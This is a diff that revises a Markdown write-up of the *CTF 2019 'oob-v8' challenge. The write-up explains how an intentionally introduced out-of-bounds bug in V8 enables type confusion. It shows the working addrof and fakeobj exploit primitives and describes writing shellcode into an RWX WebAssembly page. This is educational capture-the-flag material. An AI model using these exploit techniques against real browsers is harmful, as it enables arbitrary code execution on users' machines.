@@ -1,5 +1,14 @@
 ## Writeup
 
+### Misc
+
++ Artifact: V8
++ Version: v7.5.0
++ Time: 2019-Apr-05
++ Description: Manually introduced oob vulnerability
++ CTF: *CTF 2019
++ Challenge Name: oob-v8
+
 Refer to: https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/
 
 ### Vulnerability
@@ -52,10 +61,9 @@ Overwriting the Map field in a JSArray object can lead to type confusion in V8, 
 
 2. Array of Floats: Conversely, in an array of floating-point numbers, accessing an element directly yields the floating-point value. Here, V8 treats the value at the index as a float value.
 
-So, if we can overwrite the Map field of a array of object to an array of float, it will treat its element as float value which actually is a object pointer.
+This type confusion is crucial in V8 exploitation. To leak the address of a JSObject, we need to trick V8 into interpreting the object's pointer as an immediate value. Similarly, to perform arbitrary writes, we confuse V8 into interpreting an immediate value (such as an address) as a pointer, allowing us to overwrite the data it points to.
 
-
-By leveraging the type confusion here, we can leak arbitrary object's address:
+To leak arbitrary object's address, we can overwrite the Map field of a array of object to an array of float, then it will treat its element as float value which actually is a object pointer.
 
 ```
 var temp_obj = {"A":1};
@@ -70,7 +78,7 @@ console.log("[+] addr of temp_obj: 0x" + ftoi(addr).toString(16));
 // [+] addr of temp_obj: 0x2c4b4c4eab1
 ```
 
-In contrast, we can foo the V8 to treat an arbitrary float value (4 bytes) as an object.
+In contrast, we can foo the V8 to treat an arbitrary float value as an object.
 
 ```
 fl_arr.oob(map1);
@@ -88,37 +96,19 @@ var map1 = obj_arr.oob();
 var map2 = fl_arr.oob();
 
 function addrof(in_obj) {
-    // First, put the obj whose address we want to find into index 0
-    obj_arr[0] = in_obj;
-
-    // Change the obj array's map to the float array's map
-    obj_arr.oob(map2);
-
-    // Get the address by accessing index 0
-    let addr = obj_arr[0];
-
-    // Set the map back
-    obj_arr.oob(map1);
-
-    // Return the address as a BigInt
-    return ftoi(addr);
+    obj_arr[0] = in_obj;    // First, put the obj whose address we want to find into index 0
+    obj_arr.oob(map2);      // Change the obj array's map to the float array's map
+    let addr = obj_arr[0];  // Get the address by accessing index 0
+    obj_arr.oob(map1);      // Set the map back
+    return ftoi(addr);      // Return the address as a BigInt
 }
 
 function fakeobj(addr) {
-    // First, put the address as a float into index 0 of the float array
-    fl_arr[0] = itof(addr);
-
-    // Change the float array's map to the obj array's map
-    fl_arr.oob(map1);
-
-    // Get a "fake" object at that memory location and store it
-    let fake = fl_arr[0];
-
-    // Set the map back
-    fl_arr.oob(map2);
-
-    // Return the object
-    return fake;
+    fl_arr[0] = itof(addr);     // First, put the address as a float into index 0 of the float array
+    fl_arr.oob(map1);           // Change the float array's map to the obj array's map
+    let fake = fl_arr[0];       // Get a "fake" object at that memory location and store it
+    fl_arr.oob(map2);           // Set the map back
+    return fake;                // Return the object
 }
 ```
 
@@ -376,9 +366,9 @@ console.log("/bin/sh");
 
 ### Achieve Control-flow Hijacking: Create RWX page with WebAssembly
 
-Fot the JITed code, V8 will create a `RW-` page during the compilation of the corresponding hot function and then turns the permission of the page to `R-X` which means that once the JITed code has been allocated, we cannot overwrite it will our shellcode.
+In earlier versions of V8, the engine would generate a read-write-execute (RWX) page for WebAssembly code. The `wasm_code` in the following snippet is a simple function `main`, that returns 42. This setup ensures V8 generates an `RWX` page. Once the function is invoked, V8 jumps to the starting address of the `RWX` page, which serves as a jump table, redirecting the control flow to the `main` function.
 
-However, in the early version of V8, V8 will generate RWX page for WebAssembly. 
+![](./solution/assets/double-array-2.jpg)
 
 ```
 // https://wasdk.github.io/WasmFiddle/
@@ -395,7 +385,7 @@ console.log("[+] RWX Wasm page addr: 0x" + rwx_page_addr.toString(16));
 [+] RWX Wasm page addr: 0x7b54b655000
 ```
 
-Then, we can copy our shellcode to that place.
+Therefore, we just need to place our shellcode to the starting address of the `RWX` page and call the `main` function.
 
 ```
 function copy_shellcode(addr, shellcode) {
